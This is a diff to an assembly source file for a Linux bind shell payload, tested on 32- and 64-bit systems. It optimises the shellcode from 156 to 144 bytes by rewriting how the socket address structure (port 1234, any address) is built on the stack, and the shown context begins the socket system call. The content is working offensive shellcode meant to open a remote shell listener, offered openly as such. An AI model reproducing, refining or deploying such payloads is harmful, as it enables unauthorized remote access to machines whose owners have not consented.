@@ -27,7 +27,7 @@
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;
-; 156 byte bind shell
+; 144 byte bind shell
 ;
 ; Tested on 32 and 64-bit versions of Linux
 ;
@@ -35,27 +35,19 @@
     bits 32
 
     ; sa.sin_family = AF_INET;
+    ; sa.sin_port   = htons(1234);    
     ; sa.sin_addr   = INANY_ADDR;
-    ; sa.sin_port   = htons(1234);
-    mov     eax, ~0xD2040002 & 0xFFFFFFFF 
-    mov     ebx, ~0x00000000 & 0xFFFFFFFF 
-    not     eax
-    not     ebx
-    ; create space for sa
-    push    eax
-    push    eax
-    push    esp
-    pop     edi
-    stosd
-    xchg    eax, ebx
-    stosd
-    push    esp         ; &sa
+    xor     eax, eax
+    mov     edx, ~0xD2040002 & 0xFFFFFFFF 
+    not     edx    
+    push    eax         ; INADDR_ANY, 1234 
+    push    edx         ;  
+    push    esp         ; ebp = &sa
     pop     ebp
     
     ; step 1, create a socket
     ; x64: socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
     ; x86: socketcall(SYS_SOCKET, {AF_INET, SOCK_STREAM, IPPROTO_IP});
-    xor     eax, eax    ; eax = 0
     cdq                 ; rdx = IPPROTO_IP
     mov     al, 103     ; eax = sys_socketcall
     push    1
